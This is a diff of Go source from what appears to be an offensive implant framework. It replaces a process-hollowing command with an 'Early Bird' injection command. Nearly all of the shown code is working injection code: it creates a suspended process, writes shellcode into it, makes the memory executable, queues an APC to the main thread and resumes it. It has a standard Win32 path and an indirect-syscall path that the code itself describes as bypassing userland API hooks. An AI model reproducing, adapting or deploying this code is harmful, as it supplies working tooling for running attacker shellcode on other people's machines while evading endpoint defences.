@@ -15,29 +15,26 @@ import (
 	"killa/pkg/structs"
 )
 
-type HollowingCommand struct{}
+type EarlyBirdCommand struct{}
 
-func (c *HollowingCommand) Name() string { return "hollow" }
-func (c *HollowingCommand) Description() string {
-	return "Process hollowing — create suspended process and redirect execution to shellcode (T1055.012)"
+func (c *EarlyBirdCommand) Name() string { return "earlybird-injection" }
+func (c *EarlyBirdCommand) Description() string {
+	return "Early Bird Injection — create suspended process, queue APC with shellcode to main thread, and resume (T1055.004)"
 }
 
-type hollowParams struct {
+type earlybirdParams struct {
 	ShellcodeB64 string `json:"shellcode_b64"`
 	Target       string `json:"target"`
 	Ppid         int    `json:"ppid"`
 	BlockDLLs    bool   `json:"block_dlls"`
 }
 
-// procVirtualProtectExHollow avoids conflict with retpatch.go's procVirtualProtect
-var procVirtualProtectExHollow = kernel32.NewProc("VirtualProtectEx")
-
-func (c *HollowingCommand) Execute(task structs.Task) structs.CommandResult {
+func (c *EarlyBirdCommand) Execute(task structs.Task) structs.CommandResult {
 	if task.Params == "" {
 		return errorResult("Error: parameters required")
 	}
 
-	var params hollowParams
+	var params earlybirdParams
 	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
 		return errorf("Error parsing parameters: %v", err)
 	}
@@ -62,17 +59,17 @@ func (c *HollowingCommand) Execute(task structs.Task) structs.CommandResult {
 	runtime.LockOSThread()
 	defer runtime.UnlockOSThread()
 
-	output, err := performHollowing(shellcode, params)
+	output, err := performEarlyBird(shellcode, params)
 	if err != nil {
-		return errorResult(output + fmt.Sprintf("\n[!] Hollowing failed: %v", err))
+		return errorResult(output + fmt.Sprintf("\n[!] Early Bird Injection failed: %v", err))
 	}
 
 	return successResult(output)
 }
 
-func performHollowing(shellcode []byte, params hollowParams) (string, error) {
+func performEarlyBird(shellcode []byte, params earlybirdParams) (string, error) {
 	var sb strings.Builder
-	sb.WriteString("[*] Process Hollowing\n")
+	sb.WriteString("[*] Early Bird Injection\n")
 	sb.WriteString(fmt.Sprintf("[*] Target: %s\n", params.Target))
 	sb.WriteString(fmt.Sprintf("[*] Shellcode: %d bytes\n", len(shellcode)))
 
@@ -149,7 +146,6 @@ func performHollowing(shellcode []byte, params hollowParams) (string, error) {
 			sb.WriteString("[*] Non-Microsoft DLL blocking enabled\n")
 		}
 
-		// Build STARTUPINFOEXW with attribute list
 		type startupInfoExW struct {
 			StartupInfo   syscall.StartupInfo
 			AttributeList *PROC_THREAD_ATTRIBUTE_LIST
@@ -181,17 +177,15 @@ func performHollowing(shellcode []byte, params hollowParams) (string, error) {
 
 	sb.WriteString(fmt.Sprintf("[+] Created suspended process PID: %d, TID: %d\n", pi.ProcessId, pi.ThreadId))
 
-	// Use indirect syscalls if available (bypasses userland API hooks)
 	if IndirectSyscallsAvailable() {
-		return hollowIndirect(&sb, shellcode, pi)
+		return earlyBirdIndirect(&sb, shellcode, pi)
 	}
-	return hollowStandard(&sb, shellcode, pi)
+	return earlyBirdStandard(&sb, shellcode, pi)
 }
 
-func hollowStandard(sb *strings.Builder, shellcode []byte, pi syscall.ProcessInformation) (string, error) {
+func earlyBirdStandard(sb *strings.Builder, shellcode []byte, pi syscall.ProcessInformation) (string, error) {
 	sb.WriteString("[*] Using standard Win32 API calls\n")
 
-	// Step 2: Allocate RW memory in the new process
 	sb.WriteString(fmt.Sprintf("[*] Allocating %d bytes in target process...\n", len(shellcode)))
 
 	remoteAddr, _, allocErr := procVirtualAllocEx.Call(
@@ -206,7 +200,6 @@ func hollowStandard(sb *strings.Builder, shellcode []byte, pi syscall.ProcessInf
 	}
 	sb.WriteString(fmt.Sprintf("[+] Allocated memory at 0x%X\n", remoteAddr))
 
-	// Step 3: Write shellcode
 	sb.WriteString("[*] Writing shellcode...\n")
 
 	var bytesWritten uintptr
@@ -222,9 +215,8 @@ func hollowStandard(sb *strings.Builder, shellcode []byte, pi syscall.ProcessInf
 	}
 	sb.WriteString(fmt.Sprintf("[+] Wrote %d bytes\n", bytesWritten))
 
-	// Step 4: Change memory protection to RX
 	var oldProtect uint32
-	ret, _, protErr := procVirtualProtectExHollow.Call(
+	ret, _, protErr := procVirtualProtectX.Call( // Reuse existing procedure var from hollowing.go
 		uintptr(pi.Process), remoteAddr,
 		uintptr(len(shellcode)),
 		uintptr(PAGE_EXECUTE_READ),
@@ -236,37 +228,15 @@ func hollowStandard(sb *strings.Builder, shellcode []byte, pi syscall.ProcessInf
 	}
 	sb.WriteString("[+] Memory protection set to RX\n")
 
-	// Step 5: Get thread context
-	sb.WriteString("[*] Getting thread context...\n")
+	sb.WriteString("[*] Queuing APC to main thread...\n")
 
-	ctx := CONTEXT_AMD64{}
-	ctx.ContextFlags = 0x10001B // CONTEXT_FULL
-
-	ret, _, ctxErr := procGetThreadContext.Call(
-		uintptr(pi.Thread),
-		uintptr(unsafe.Pointer(&ctx)),
-	)
+	ret, _, apcErr := procQueueUserAPC.Call(remoteAddr, uintptr(pi.Thread), 0)
 	if ret == 0 {
 		_ = syscall.TerminateProcess(pi.Process, 1)
-		return sb.String(), fmt.Errorf("GetThreadContext failed: %v", ctxErr)
+		return sb.String(), fmt.Errorf("QueueUserAPC failed: %v", apcErr)
 	}
+	sb.WriteString("[+] APC queued to main thread\n")
 
-	sb.WriteString(fmt.Sprintf("[+] Original RCX (entry point): 0x%X\n", ctx.Rcx))
-
-	// Step 6: Set RCX to shellcode address
-	ctx.Rcx = uint64(remoteAddr)
-
-	ret, _, ctxErr = procSetThreadContext.Call(
-		uintptr(pi.Thread),
-		uintptr(unsafe.Pointer(&ctx)),
-	)
-	if ret == 0 {
-		_ = syscall.TerminateProcess(pi.Process, 1)
-		return sb.String(), fmt.Errorf("SetThreadContext failed: %v", ctxErr)
-	}
-	sb.WriteString(fmt.Sprintf("[+] Set RCX to shellcode at 0x%X\n", remoteAddr))
-
-	// Step 7: Resume the thread
 	sb.WriteString("[*] Resuming thread...\n")
 
 	ret, _, resumeErr := procResumeThread.Call(uintptr(pi.Thread))
@@ -276,15 +246,14 @@ func hollowStandard(sb *strings.Builder, shellcode []byte, pi syscall.ProcessInf
 	}
 
 	sb.WriteString("[+] Thread resumed successfully\n")
-	sb.WriteString(fmt.Sprintf("[+] Process hollowing complete — PID %d running shellcode\n", pi.ProcessId))
+	sb.WriteString(fmt.Sprintf("[+] Early Bird Injection complete — PID %d running shellcode\n", pi.ProcessId))
 
 	return sb.String(), nil
 }
 
-func hollowIndirect(sb *strings.Builder, shellcode []byte, pi syscall.ProcessInformation) (string, error) {
+func earlyBirdIndirect(sb *strings.Builder, shellcode []byte, pi syscall.ProcessInformation) (string, error) {
 	sb.WriteString("[*] Using indirect syscalls (calls from ntdll)\n")
 
-	// Step 2: Allocate RW memory via NtAllocateVirtualMemory
 	regionSize := uintptr(len(shellcode))
 	var remoteAddr uintptr
 	sb.WriteString(fmt.Sprintf("[*] Allocating %d bytes...\n", len(shellcode)))
@@ -297,7 +266,6 @@ func hollowIndirect(sb *strings.Builder, shellcode []byte, pi syscall.ProcessInf
 	}
 	sb.WriteString(fmt.Sprintf("[+] Allocated memory at 0x%X\n", remoteAddr))
 
-	// Step 3: Write shellcode
 	sb.WriteString("[*] Writing shellcode...\n")
 
 	var bytesWritten uintptr
@@ -309,7 +277,6 @@ func hollowIndirect(sb *strings.Builder, shellcode []byte, pi syscall.ProcessInf
 	}
 	sb.WriteString(fmt.Sprintf("[+] Wrote %d bytes\n", bytesWritten))
 
-	// Step 4: Change protection to RX
 	protectAddr := remoteAddr
 	protectSize := uintptr(len(shellcode))
 	var oldProtect uint32
@@ -321,30 +288,15 @@ func hollowIndirect(sb *strings.Builder, shellcode []byte, pi syscall.ProcessInf
 	}
 	sb.WriteString("[+] Memory protection set to RX\n")
 
-	// Step 5: Get thread context via NtGetContextThread
-	sb.WriteString("[*] Getting thread context via NtGetContextThread...\n")
+	sb.WriteString("[*] Queuing APC to main thread...\n")
 
-	ctx := CONTEXT_AMD64{}
-	ctx.ContextFlags = 0x10001B // CONTEXT_FULL
-
-	status = IndirectNtGetContextThread(uintptr(pi.Thread), uintptr(unsafe.Pointer(&ctx)))
+	status = IndirectNtQueueApcThread(uintptr(pi.Thread), remoteAddr, 0, 0, 0)
 	if status != 0 {
 		_ = syscall.TerminateProcess(pi.Process, 1)
-		return sb.String(), fmt.Errorf("NtGetContextThread failed: NTSTATUS 0x%X", status)
+		return sb.String(), fmt.Errorf("NtQueueApcThread failed: NTSTATUS 0x%X", status)
 	}
-	sb.WriteString(fmt.Sprintf("[+] Original RCX (entry point): 0x%X\n", ctx.Rcx))
+	sb.WriteString("[+] APC queued to main thread\n")
 
-	// Step 6: Set RCX to shellcode address via NtSetContextThread
-	ctx.Rcx = uint64(remoteAddr)
-
-	status = IndirectNtSetContextThread(uintptr(pi.Thread), uintptr(unsafe.Pointer(&ctx)))
-	if status != 0 {
-		_ = syscall.TerminateProcess(pi.Process, 1)
-		return sb.String(), fmt.Errorf("thread context set failed: NTSTATUS 0x%X", status)
-	}
-	sb.WriteString(fmt.Sprintf("[+] Set RCX to shellcode at 0x%X\n", remoteAddr))
-
-	// Step 7: Resume thread via NtResumeThread
 	sb.WriteString("[*] Resuming thread...\n")
 
 	var prevCount uint32
@@ -355,7 +307,7 @@ func hollowIndirect(sb *strings.Builder, shellcode []byte, pi syscall.ProcessInf
 	}
 
 	sb.WriteString(fmt.Sprintf("[+] Thread resumed (previous suspend count: %d)\n", prevCount))
-	sb.WriteString(fmt.Sprintf("[+] Indirect syscall hollowing complete — PID %d running shellcode\n", pi.ProcessId))
+	sb.WriteString(fmt.Sprintf("[+] Indirect syscall Early Bird Injection complete — PID %d running shellcode\n", pi.ProcessId))
 
 	return sb.String(), nil
 }
